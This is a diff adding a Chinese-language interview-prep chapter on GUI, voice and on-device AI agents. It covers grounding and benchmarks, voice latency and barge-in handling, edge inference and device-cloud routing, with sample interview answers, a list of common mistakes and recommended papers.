+#### 2.3 Grounding 与评测体系：第一大失败来源，及 OSWorld 为何远低于 SWE-bench
+
+**Grounding** 指把语义意图（"点击提交按钮"）映射到具体坐标/元素，是 GUI Agent 相对纯文本 Agent 的核心新增能力，也是**实测中最主要的失败模式**：规划正确但点偏、点中相邻元素、在专业软件里找不到图标。**ScreenSpot** 系列专测此能力；**ScreenSpot-Pro** 用高分辨率专业软件（IDE、CAD、办公套件）截图，初代通用多模态模型得分极低（普遍不足 20%，部分接近个位数），暴露了通用 VLM 视觉预训练与 UI 定位之间的显著 gap——这正是 OS-Atlas、ShowUI、UI-TARS 等专门做 GUI grounding 数据合成与预训练的动机。
+
+评测分两层：grounding 专项（ScreenSpot 系）与端到端综合。综合线上 **OSWorld**（真实 Ubuntu 桌面、369 个跨应用任务、程序化验收脚本判终态）是事实标准，其修订版 OSWorld-Verified 上前沿模型约 60%，人类约 72%；Web 侧有 WebArena / VisualWebArena（自托管可复现站点）与 WebVoyager（真实网站）；移动端 AndroidWorld。
+
+**高频追问：为什么 OSWorld 长期远低于同期 SWE-bench？** 要点：① 动作空间连续且细粒度（坐标点击 vs 文本 patch），单步容错低；② grounding 误差随步数**乘法累积**——30 步任务即便单步 97% 正确，整体成功率也只剩约四成；③ 反馈稀疏：代码 Agent 每步都有编译器/测试这种**廉价、高频、可靠的验证器**，GUI Agent 只能再截一张图自我判断，验证本身就会出错；④ 部分可观察且状态难重置，错一步可能进入不可恢复分支。这道题本质考"验证器质量决定 Agent 能力上限"的判断（呼应第 8、13 章）。
+
+#### 2.4 模型产品主线、浏览器宿主化与移动端谱系
+
+**主线时间轴**：**Claude computer-use**（2024.10）——首个 API 化的通用 computer-use 能力，纯视觉+坐标输出，发布时 OSWorld 得分仅约 15%，标志意义大于即战力；**OpenAI CUA / Operator**（2025.1）——CUA 模型+托管浏览器产品，2025.7 并入 **ChatGPT Agent**（Operator 的操作能力 + Deep Research 的调研能力 + 终端，Agent 在虚拟机内自选工具）；**UI-TARS**（字节，2025 年初）——原生 GUI Agent 模型路线代表，不靠外挂框架，把感知、grounding、System-2 推理与纠错轨迹端到端训进模型；**OS-Atlas / ShowUI / SeeClick** 学术线聚焦开源 grounding 数据与轻量 GUI 专用模型。
+
+**2025H2：浏览器成为 Agent 宿主。** **ChatGPT Atlas**（OpenAI 自研浏览器，2025.10）、**Perplexity Comet**、**Claude for Chrome**（扩展形态）、**Gemini in Chrome** 相继落地。格局意义：浏览器天然持有登录态、Cookie、支付信息与页面结构，Agent 寄生其中即可复用用户身份，免掉"托管虚拟机+重新登录"的摩擦，人还可随时接管——浏览器从"被操控的对象"升级为"Agent 的运行时/宿主"，入口之争从搜索框转移到浏览器本体。代价是 Agent 被直接推入用户真实凭证环境，攻击面同步放大。
+
+**移动端谱系**：AppAgent（2023 底，LLM 自探索学习 App 操作）→ **Mobile-Agent**（阿里，多模态纯视觉定位）→ **AutoGLM**（智谱，2024.10，Phone Use 国内落地代表）。通道上：安卓走 **Accessibility API**（读控件树+代发事件，免 root）或 **ADB**（注入坐标事件，需调试授权）；iOS 系统封闭，基本只能厂商合作或云真机。移动端特有难点：大量自绘控件导致控件树质量参差、跨 App 跳转的上下文切换、系统权限弹窗打断。
+
+**安全要点**：GUI Agent 天然凑齐 lethal trifecta 三要素——读网页=接触不可信内容，登录态=私有数据，操作浏览器=对外行动能力；页面内容注入（隐藏文字、评论区指令）是主攻击面。标准缓解四件套：**隔离浏览器实例/独立 profile**、**凭证保险箱**（密码本地填充，模型不见明文）、**终态/不可逆动作人工确认**（下单、发送、删除）、**域名白名单**。机制展开见第 9 章提示注入专题，此处不重复。
+
+#### 2.5 语音 Agent 两条技术路线：级联 vs 端到端
+
+**级联式（Cascaded）：ASR → LLM → TTS。** 三个独立模型串成流水线：语音识别转文本、LLM 生成回复文本、语音合成播出。优点是**每一环节可独立选型与替换**；可控性强：文本中间态便于加 guardrail、敏感词过滤、日志审计，且能**直接复用文本 Agent 的全部工具与提示词生态**。代价有二：**延迟逐环节叠加**（每级都有自己的排队与首包时间），以及**中间文本是有损压缩**——语速、迟疑、哽咽、反讽、口音等副语言（paralinguistic）信息在转写时全部丢失：用户带着哭腔说的"我没事"和平静说的"我没事"，LLM 看到的是同一个字符串。
+
+**端到端（Speech-to-Speech）：** 模型原生消费与产出音频 token，代表是 OpenAI Realtime API（WebSocket/WebRTC 两种接入）与 Google Gemini Live API。优点：延迟显著更低（省去两次模态转换）、保留并能输出语气情绪、对话节奏接近真人。弱点：**可控性弱**（没有文本中间态可拦截，越权的话说出去就是说出去了）、复杂工具调用与 policy following 能力普遍弱于同代文本模型、调试与评估工具链不成熟。
+
+**2026 年的工程共识：级联为主、端到端上量中。** 可靠性敏感的 B 端场景（客服、外呼、催收）几乎全是级联；端到端在陪伴、口语陪练等自然度敏感、容错高的 C 端场景快速上量。面试标准答案是"按场景选路线"，不是二选一站队。
+
+#### 2.6 延迟工程：与人类 200ms 的轮转期望赛跑
+
+人类对话的轮转（turn-taking）间隔期望在 **200–300ms** 量级，沉默超过 1 秒就会引发"喂？还在吗"。语音 Agent 的 voice-to-voice 延迟要拆成四段做预算：
+
+| 环节 | 典型量级 | 说明 |
+|---|---|---|
+| VAD 判停 | 200–700ms | 静音等待阈值本身就是延迟：等得越久越确定用户说完了 |
+| ASR 尾包 | 100–300ms | 流式识别收尾、产出最终转写 |
+| LLM TTFT | 200–800ms | 首 token 时间，随模型规模与上下文长度变化 |
+| TTS 首音频块 | 100–300ms | 首句合成出第一块可播放音频 |
+
+四段相加，级联式做到 **1 秒内算优秀，1.5 秒以上明显卡顿**（数字为量级参考）。核心优化是**流式三级并行**：① 流式 ASR 持续吐 partial transcript，不等说完；② LLM 拿 partial 就**提前推理**（投机执行）——判停确认后转写没变则直接复用，变了则丢弃重推；③ LLM 流式输出按标点**分句送 TTS**，首句一成型就开始合成播放，后续句子流水线跟上。三级并行把"串行相加"变成"关键路径最长者"，是延迟工程第一考点。第二考点是**工具调用垫话（filler）**：查订单要 2–3 秒 API 往返，冷场是致命的——判停后立即播一句"好的，我帮您查一下"（预制音频或小模型快速生成），把工具延迟藏进垫话与自然停顿里。
+
+#### 2.7 交互难点：判停、打断与全双工
+
+**Turn detection（判停）是语音 Agent 第一难题。** 能量级 VAD（如 Silero）只回答"有没有人在说话"，用"静音超过 X ms"判停：X 小了抢话（用户只是停顿思考），X 大了拖延迟。**语义级判停**用轻量模型看转写内容判断"这句话在语义上完整了吗"（"我想查一下我的……"显然没完），据此**动态调整静音等待**——语义完整则缩短、不完整则延长。LiveKit、Pipecat 等框架均已内置语义判停模型。
+
+**Barge-in（用户打断）是三连动作**：① 立即停 TTS 并**冲掉客户端音频缓冲**（不冲缓冲，已下发的音频会继续播）；② 取消进行中的 LLM 生成流；③ **状态回滚**——对话历史必须截断到用户**实际听到**的位置，否则 Agent 以为整段话已送达，后续对话建立在用户没听到的内容上。第三步最易被忽略，靠"已播放时长 ↔ 文本位置"对齐截断（OpenAI Realtime API 为此提供 truncate 语义）。另需区分真打断与 backchannel（"嗯""好的"）——短促、低能量、转写为语气词的不应触发打断。
+
+**全双工（full-duplex）是终局形态**：模型同时听与说、能发附和声、被打断即时接话，代表是 Kyutai 的 Moshi 线（双音频流 + "内心独白"文本流，理论延迟低至 200ms 量级）。但能力现实骨感：**τ³-bench（见第 8 章）显示同任务语音成绩仅约文本的 30–45%**——模态叠加 + 实时交互是当前明确的能力洼地，"上语音会让 Agent 显著变笨"是可直接引用的定量弹药。
+
+**框架与生态速览**：开源编排层两大主流是 **Pipecat**（pipeline 抽象、供应商插件最全）与 **LiveKit Agents**（WebRTC 基础设施出身，自带边缘网络与语义判停）；托管层 **Vapi / Retell AI** 类平台把编排、电话接入、供应商聚合打包成 API，快速上线但深度定制受限。电话场景一句话：**PSTN 是 8kHz 窄带音频（G.711），ASR 准确率显著低于 16kHz 宽带**，接入通常走 Twilio Media Streams（WebSocket 双向音频流）。
+
+#### 2.8 端侧 Agent：三重红利与一个根本约束
+
+端侧 Agent 指模型推理与决策主要发生在用户设备（手机、PC、车机、可穿戴）本地的 Agent 形态。价值主张可概括为三重红利：**隐私**——屏幕内容、输入记录、相册、健康数据等最敏感的个人上下文不出设备，天然规避数据合规与传输风险，这也是唯一"云端做不到、端侧才有"的能力；**延迟与可用性**——没有网络往返，首响应由本地 prefill 决定，弱网/离线场景（车载、出行、隐私敏感行业内网）依然可用；**成本**——算力来自用户设备，服务方的边际推理成本趋近于零，这对日活千万级的助手类产品是数量级的成本结构差异。
+
+但所有红利都建立在一个根本约束之上：**能力差距**。端侧可跑的模型与云端旗舰相差约两个数量级参数量，复杂推理、长程规划、开放域知识都明显不及。因此端侧 Agent 的设计核心不是"把云端搬下来"，而是**在能力受限的前提下重新划分任务边界**——这决定了后面所有架构选择。
+
+#### 2.9 端侧推理栈与内存带宽墙
+
+主流端侧推理框架：**llama.cpp**（GGUF 格式，CPU/GPU 通吃、生态最广）、**Apple MLX**（面向 Apple Silicon 统一内存架构）、**ExecuTorch**（PyTorch 官方移动端方案）、**MNN**（阿里，国内移动端广泛落地）、**ONNX Runtime**（跨平台通用）。硬件加速单元是 NPU——Apple ANE、高通 Hexagon 等。
+
+面试题眼在于：**端侧 LLM 的瓶颈通常不是算力而是内存带宽**。decode 阶段每生成一个 token 都要把全部权重从内存读一遍（memory-bound，与第 10 章 Prefill/Decode 分析同理），而手机 LPDDR 带宽只有数十 GB/s 量级，与数据中心 GPU 的数 TB/s 相差百倍——NPU 标称的几十 TOPS 峰值算力主要惠及 compute-bound 的 prefill 和视觉任务，救不了 decode。由此推出两个默认工程形态：**4-bit 量化是端侧默认**（3B 模型 4-bit 约 1.5–2GB，权重变小既省内存也等比减少每 token 的读带宽，直接提升生成速度）；**KV cache 与权重、操作系统、其他 App 争抢同一块 RAM** 是移动端特有矛盾——手机内存通常 8–16GB 且无 swap 余地，长上下文的 KV cache 很快挤爆预算，所以端侧普遍上下文短、并配合 KV 量化 / 滑动窗口注意力等手段压缩。
+
+#### 2.10 端云协同：Apple Intelligence 分层与路由同构
+
+端侧主力是 **3B 上下的小模型**：Qwen 系列小尺寸、微软 Phi-mini、Google Gemma 端侧系等，通常针对指令跟随与函数调用强化，牺牲开放域知识换取窄任务可用性。
+
+端云协同的标杆设计是 **Apple Intelligence 的分层架构**：约 3B 的端侧模型处理大多数请求；超出端侧能力的任务升级到 **Private Cloud Compute（PCC）**——运行在 Apple 自研芯片服务器上的云端大模型，其关键不是"更大"，而是把端侧的隐私承诺延伸到云端：无状态计算、不留存用户数据、软件镜像可供安全研究者审计验证；系统**按任务复杂度自动路由**端/云。PCC 回答了"升云是否等于放弃隐私"这一质疑，是讨论端云协同时的必引案例。
+
+端云协同的一般模式：**简单意图端侧秒回，复杂任务升云**——路由信号包括任务复杂度、隐私敏感度、网络状态与电量。这与第 10 章的模型路由/级联（cascade routing）完全同构，只是路由边界从"便宜模型 vs 贵模型"变成"设备 vs 云"，且多了隐私这一路由维度。它也是第 11 章 NVIDIA《Small Language Models are the Future of Agentic AI》立场文的自然落地：agent 子任务窄而重复，SLM 承担执行、LLM 只留规划兜底——端云分层就是该异构架构的物理实现。
+
+#### 2.11 手机 GUI Agent 的权限通道：Accessibility vs App Intents vs 纯视觉
+
+手机 GUI Agent 有一条云端没有的独特通道：**系统级权限**。Android 的 Accessibility（无障碍服务）可以读取屏幕控件树并注入点击/输入，是"看屏操作"类 agent 的主流实现；Apple 的 **App Intents** 则是声明式方案——App 向系统注册结构化动作，agent 通过语义调用而非模拟点击完成任务，更可靠也更受控。相比纯视觉方案（截屏 + 坐标点击），系统通道拿到的是结构化状态，但依赖平台开放程度与 App 生态配合——**权限与生态是端侧 GUI agent 比算力更硬的约束**：能力上限由 OS 厂商与 App 是否暴露接口决定，这一点与 2.2 节的表征三路线在移动端交汇。
+
+---
+
+### 三、面试高频考点
+
+| 考点 | 高频度 | 一句话题眼 |
+|---|---|---|
+| GUI 输入表征三路线（截图 vs DOM vs SoM） | ⭐⭐⭐ | 通用性 vs 精确性；SoM 把坐标回归降维成编号分类 |
+| Grounding 为何是第一大失败来源 | ⭐⭐⭐ | 语义→坐标映射；ScreenSpot-Pro 暴露专业软件 gap |
+| OSWorld 为何远低于 SWE-bench | ⭐⭐⭐ | 连续动作空间／误差乘法累积／无廉价验证器／反馈稀疏 |
+| computer-use 发展脉络与浏览器宿主化 | ⭐⭐ | 2024.10 Claude → 2025.1 Operator → 2025.7 ChatGPT Agent；Atlas/Comet 复用登录态、攻击面放大 |
+| 级联 vs 端到端语音路线选型 | ⭐⭐⭐ | 可控性/工具生态 vs 延迟/自然度，按场景选而非站队 |
+| voice-to-voice 延迟预算与流式三级并行 | ⭐⭐⭐ | 四段预算对标人类 200–300ms；partial ASR→投机推理→TTS 分句，串行加法变关键路径 |
+| barge-in 三连与语义判停 | ⭐⭐⭐ | 停播冲缓冲、断生成、历史截断到实听位置；"说完了吗"是语义问题不是音量问题 |
+| τ³-bench 语音能力洼地 | ⭐⭐ | 语音成绩约文本 30–45%（第 8 章），模态叠加+实时交互是短板 |
+| 端侧三重红利与能力差距约束 | ⭐⭐⭐ | "什么场景值得做端侧"的标准框架 |
+| 端侧 decode 内存带宽墙与 4-bit 量化 | ⭐⭐⭐ | memory-bound，NPU TOPS 救不了 decode；量化双重收益 |
+| 端云路由与 Apple PCC | ⭐⭐ | 与第 10 章模型级联同构，多了隐私/网络/电量维度；升云不等于弃隐私 |
+| Accessibility / App Intents / 纯视觉；GUI 安全四件套 | ⭐⭐ | 系统通道 vs 模拟点击；隔离实例/凭证保险箱/终态确认/域白名单（第 9 章） |
+
+---
+
+### 四、经典面试题与参考答案
+
+#### 题 1（GUI·架构选型 ⭐⭐⭐）：做一个 Web 自动化 Agent，DOM 方案和纯视觉方案怎么选？如果做混合架构，你会怎么设计？
+
+参考答案要点：
+
+- 先给选型维度：目标环境（只做 Web→DOM 可行；要覆盖桌面/跨应用→必须有视觉）、定位精度要求、页面是否反爬/DOM 混淆、是否需要 headless、token 成本。
+- DOM 路线：优势是元素句柄精确、动作可程序化验证、不依赖强视觉模型；失效于 Canvas/跨域 iframe/shadow DOM/自绘组件、DOM 与实际渲染不一致、超长 DOM 的裁剪损失。
+- 纯视觉路线：所见即所得、平台无关、对 DOM 混淆免疫；失效于 grounding 误差、高分辨率下成本与延迟、拿不到元素语义属性。
+- 混合设计（分层作答是加分点）：**感知层**用 AX tree 枚举可交互元素并在截图上叠 SoM 编号；**动作层**三级回退：元素句柄 → SoM 编号 → 原始坐标（覆盖 Canvas 等不可枚举区域）；**验证层**双通道：DOM/URL 断言 + 截图视觉复核，两者矛盾时以渲染结果为准。
+- 追问弹药：SoM 的失效场景（密集表格、编号遮挡、动态刷新需每步重标注）；为什么验证层必须独立于动作层（同源误差会互相掩盖）。
+
+#### 题 2（GUI·机制推理 ⭐⭐⭐）：为什么说"grounding 误差累积 + 缺少廉价验证器"决定了 GUI Agent 的成功率天花板？工程上如何补验证器？
+
+参考答案要点：
+
+- 数学直觉：成功率≈单步正确率^步数，30 步任务单步 97% 也只剩约 40%，长任务对单步精度极度敏感；而 GUI 没有编译器/单测这种每步可跑、近零成本、判定可靠的验证器，误检会让 Agent 在错误分支上继续消耗预算。
+- 工程补法（给出谱系）：① DOM/URL/文件系统断言等程序化检查；② 旁路核对——操作完成后用只读 API 查询终态（如下单后查订单接口），不信任界面自报；③ 视觉 judge 模型做截图复核（成本高，用在关键节点）；④ 不可逆动作前人工确认。
+- 结构性缓解：把长任务切成短的、各自带验收条件的子目标（milestone 化），让误差在段内清零而非全程累积——OSWorld 用终态验收脚本而非过程匹配来判分，工程上应模仿同一思想（与第 8 章终态评估、第 13 章验证器分层一脉相承）。
+
+#### 题 3（语音·基础→进阶 ⭐⭐⭐）：级联式语音 Agent 的延迟是怎么叠加起来的？给出至少三个把 voice-to-voice 延迟压进 1 秒的手段。
+
+参考答案要点：
+
+- 先拆预算：VAD 判停（200–700ms，静音等待本身是延迟）+ ASR 尾包（100–300ms）+ LLM TTFT（200–800ms）+ TTS 首音频块（100–300ms），四段串行相加，另有网络与音频缓冲开销。
+- 手段一：**流式三级并行**——partial ASR 驱动 LLM 提前投机推理（判停后转写未变则复用），LLM 输出分句送 TTS 边合成边播，把加法变成关键路径最长者。
+- 手段二：**语义判停**动态调静音阈值，语义完整就提前收音，直接砍最大的一段延迟。
+- 手段三：**工具调用垫话**把 2–3 秒的 API 往返藏进"我帮您查一下"里；TTFT 侧可用 prompt 前缀缓存、就近部署/自托管推理压首包。
+- 加分：传输层选 WebRTC（UDP、抗抖动）优于裸 WebSocket；报延迟要报 p95 而非均值，打断响应时间单独立 SLO。
+
+#### 题 4（语音·系统设计 ⭐⭐⭐）：设计一个电话渠道的语音客服坐席 Agent（查订单、改地址、退款申请），要求给出延迟预算、打断处理、低置信度确认、静音兜底、转人工与合规方案。
+
+参考答案要点：
+
+**（1）路线与架构选型**
+- 选**级联式**：客服是强 policy 场景，需要文本中间态做 guardrail、审计与工具复用；端到端 speech-to-speech 的工具调用与规则遵循能力不足（可引 τ³-bench 语音仅约文本 30–45%，见第 8 章）。
+- 链路：Twilio Media Streams（8kHz G.711，WebSocket 双向音频）→ 流式 ASR（配电话窄带模型 + 业务热词表）→ LLM（function calling 接工单/订单系统）→ 流式 TTS 分句回传。编排用 Pipecat 或 LiveKit Agents，会话状态外置以支持断线重连。
+
+**（2）延迟预算表（voice-to-voice p95 目标 ≤ 1.2s，量级参考）**
+
+| 环节 | 预算 | 保障手段 |
+|---|---|---|
+| VAD/判停 | ≤ 500ms | 语义判停动态阈值：语义完整 300ms、不完整放宽到 800ms |
+| ASR 尾包 | ≤ 200ms | 流式识别 + partial 提前送下游 |
+| LLM TTFT | ≤ 400ms | 前缀缓存、精简系统提示、partial 投机推理 |
+| TTS 首块 | ≤ 200ms | 分句合成、常用话术预合成缓存 |
+
+- 工具调用不占本预算：判停后先出垫话，工具异步跑；超 3 秒追加进度播报（"还在查，请稍等"）。垫话用多条预制音频轮换避免机械感，且垫话本身可被打断。
+
+**（3）打断处理（barge-in 三连）**
+- 检测到用户语音：停 TTS 下发 + **冲客户端/Twilio 播放缓冲**；取消 LLM 生成流；按已播放时长把对话历史截断到用户实听位置。
+- backchannel 过滤：短促语气词（"嗯""好"）不触发打断；打断灵敏度与误打断率要拿录音回放调参。
+
+**（4）ASR 低置信度确认**
+- 关键槽位（订单号、手机号、金额）设置置信度阈值：低于阈值不直接入库，**复述确认**（"您说的是尾号 1234，对吗？"）；数字串用热词/约束解码增强。
+- 与置信度无关：退款等**不可逆操作一律显式二次确认**，确认话术把金额与订单复述一遍。
+- 连续两次识别失败降级到 **DTMF 按键输入**（"请直接按键输入订单后四位"）。
+
+**（5）静音兜底**
+- 分级超时：约 5 秒无声→"请问您还在吗"；再次超时→总结当前进度 + 承诺短信回执 → 礼貌挂断。
+- 上下文感知放宽：刚要求用户找订单号/银行卡时，超时阈值放宽（用户在翻东西），避免催促感。
+
+**（6）转人工**
+- 触发条件：用户明确要求；情绪升级信号；连续 N 次低置信/理解失败；请求超出 Agent policy 权限（如大额退款）。
+- 转接时携带**结构化上下文摘要**（身份、诉求、已执行操作、卡点），杜绝用户对人工复述一遍；无人工在线时留言 + 回拨承诺，工单落库。
+
+**（7）录音与合规**
+- 通话开头播报录音告知，按最严格适用辖区配置同意方式；转写与录音分级存储、设保留期限与删除流程；卡号等敏感段在录音/转写中静音或脱敏；与模型/ASR 供应商签数据不用于训练条款。
+
+**（8）评估与上线（加分项）**
+- 任务完成率按**后端 DB 终态**判定而非嘴上说了什么（τ-bench 思路，呼应第 8 章）；SLO 上报 voice-to-voice p95、打断响应时间、误打断率、转人工率、单通成本；坏例排查靠"录音 + 转写 + Agent trace"三方对齐回放；上线走影子模式 → 小流量灰度。
+
+#### 题 5（端侧·开放题 ⭐⭐⭐）：为什么端侧 Agent 难做？什么场景值得做？
+
+参考答案要点：
+
+- 先立框架：三重约束 vs 三重红利。**约束**：(a) 算力——设备内存与带宽限制模型在 3B 量级 + 4-bit 量化，与云端旗舰有约两个数量级参数差距，复杂规划与长任务能力不足；(b) 权限——agent 要操作设备必须走系统通道（Accessibility/App Intents），受平台管控，能力上限由 OS 厂商决定；(c) 生态——App 是否暴露结构化接口、跨 App 任务链路是否打通，非单一厂商可控。**红利**：隐私（数据不出设备，云端无法替代）、延迟/离线可用、边际成本为零。
+- 值得做的场景 = 红利显著且约束可容忍：任务窄而高频（输入法建议、通知摘要、语音指令解析——正合第 11 章 NVIDIA SLM 立场文"窄而重复的子任务交给 SLM"）；数据高度敏感（屏幕/健康/输入内容）；离线刚需（车载）；调用量巨大到 API 成本不可承受。
+- 加分收尾：现实最优解不是纯端侧而是**端云分层**——端侧秒回简单意图、复杂任务升云（与第 10 章模型路由同构），并举 Apple Intelligence + PCC 说明升云仍可保隐私。
+
+#### 题 6（端侧·机制推理 ⭐⭐⭐）：手机 SoC 宣称有几十 TOPS 的 NPU，为什么端侧 LLM 的生成速度依然慢？如何优化？
+
+参考答案要点：
+
+- 机制：decode 每 token 需读取全部权重，算术强度极低，是 memory-bound；瓶颈是 LPDDR 数十 GB/s 量级的带宽而非 NPU 算力。粗略估算：生成速度上限 ≈ 内存带宽 ÷ 权重字节数，与 TOPS 无关。NPU 高算力主要加速 compute-bound 的 prefill（缩短首响应）与多模态编码。
+- 优化方向即"减少每 token 读的字节数或摊薄读取"：更低比特量化（4-bit 为默认，权重变小直接线性提升 decode 上限）；KV cache 量化与滑动窗口控制内存占用；投机解码（小 draft 模型起草、一次验证多 token，摊薄权重读取次数）；以及架构层面选更小模型 + 端云路由，而不是硬扛大模型。
+
+---
+
+### 五、易错点·反直觉点
+
+1. **把"DOM 方案省 token"当优点**：真实页面 DOM 常达数万 token，往往比一张截图更贵；正确表述是"定位精确、可程序化校验，但需要激进裁剪且裁剪丢信息"。
+2. **认为 SoM 已彻底解决 grounding**：SoM 只覆盖结构可枚举的元素，Canvas、自绘控件、桌面应用仍需回退坐标回归；标注管线的漏标率就是方案上限，动态页面还有编号漂移问题。
+3. **把 OSWorld"前沿约 60% vs 人类约 72%"读成"接近人类"**：基准是有限任务集+验收脚本，真实开放环境的长尾（弹窗、界面改版、验证码、A/B 实验）不在分布内，数字对比仅在基准内部有效。
+4. **以为语音延迟大头在 LLM**：实际 VAD 判停的静音等待往往是第一大头，且它是"故意等出来的"延迟——砍它靠语义判停动态缩短等待，而不是换更快的模型；只优化 TTFT 会系统性押错重点。
+5. **barge-in 只停播放、不回滚历史**：Agent 的对话历史里留着用户根本没听到的半段话，后续指代与承诺全部错位。必须按已播放音频时长把 assistant 消息截断到实听位置。
+6. **把端到端 speech-to-speech 当无脑升级**：它在自然度与延迟上占优，但工具调用与 policy following 显著弱于文本路线（τ³-bench 的 30–45% 即证据），客服类强规则场景直接翻车——路线选择要跟着场景的可控性要求走。
+7. **把端侧瓶颈归因于"算力不够"**：decode 是 memory-bound，每 token 要通读全部权重，手机内存带宽比数据中心 GPU 低约两个数量级才是天花板；答"换更强 NPU 就能提速生成"会暴露对推理两阶段特征的不理解。
+8. **只算权重、不算 KV cache 的内存账**：手机 RAM 由系统、前台 App、模型权重、KV cache 共享，长上下文的 KV cache 增长很快让"模型装得下"变成"对话跑不动"——端侧内存预算必须按"权重 + KV + 系统余量"整体核算。
+9. **把"升云"简单等同于"放弃隐私"**：Apple PCC 证明端云协同可以带可验证的隐私保证（无状态、可审计）；反过来也不能把 PCC 说成普通云 API。答题时应把隐私作为路由的连续维度而非端/云二分。
+
+---
+
+### 六、推荐资源
+
+1. **[OSWorld: Benchmarking Multimodal Agents for Open-Ended Tasks in Real Computer Environments](https://arxiv.org/abs/2404.07972)**（2024）：GUI Agent 端到端评测的事实标准——真实 Ubuntu 桌面、程序化终态验收；理解"验证器决定天花板"与 OSWorld vs SWE-bench 差距归因的一手材料。
+2. **[UI-TARS: Pioneering Automated GUI Interaction with Native Agents](https://arxiv.org/abs/2501.12326)**（字节，2025）：原生 GUI Agent 模型路线的代表论文，把感知、grounding、System-2 推理与纠错轨迹端到端训进模型，读它可打通"外挂框架 vs 原生模型"之争。
+3. **[Set-of-Mark Prompting](https://arxiv.org/abs/2310.11441)**（2023）+ **[SeeClick / ScreenSpot](https://arxiv.org/abs/2401.10935)**（2024）：前者是 SoM 标注范式的出处（坐标回归→编号分类），后者是 GUI grounding 专项评测的起点，两篇合读覆盖表征与 grounding 两大考点。
+4. **[Anthropic — Developing a computer use model](https://www.anthropic.com/news/developing-computer-use)**（2024-10）：首个 API 化 computer-use 能力的官方复盘，含安全设计考量，是产品主线时间轴的起点文献。
+5. **[OpenAI Realtime API 文档](https://platform.openai.com/docs/guides/realtime)** + **[Pipecat](https://github.com/pipecat-ai/pipecat)** / **[LiveKit Agents](https://github.com/livekit/agents)**：端到端语音路线与级联编排框架的第一手工程参考；truncate 语义、语义判停、供应商插件体系都在这三处文档里。
+6. **[Moshi: a speech-text foundation model for real-time dialogue](https://arxiv.org/abs/2410.00037)**（Kyutai，2024）：全双工语音模型的代表作——双音频流 + "内心独白"文本流，理解 turn-taking 终局形态的必读论文。
+7. **[Apple — Private Cloud Compute](https://security.apple.com/blog/private-cloud-compute/)**（2024）：端云协同隐私设计的标杆文献，无状态计算、可审计镜像等机制的官方阐述，"升云不等于弃隐私"论点的出处。
+8. **[NVIDIA — Small Language Models are the Future of Agentic AI](https://arxiv.org/abs/2506.02153)**（2025）：SLM 执行 + LLM 规划的异构经济学立场文（详见第 11 章），端云分层是其物理实现，端侧选型题的理论锚点。
+
+---
 
 > 📘 本手册完。配套动手实验见 labs/ 目录。祝面试顺利！
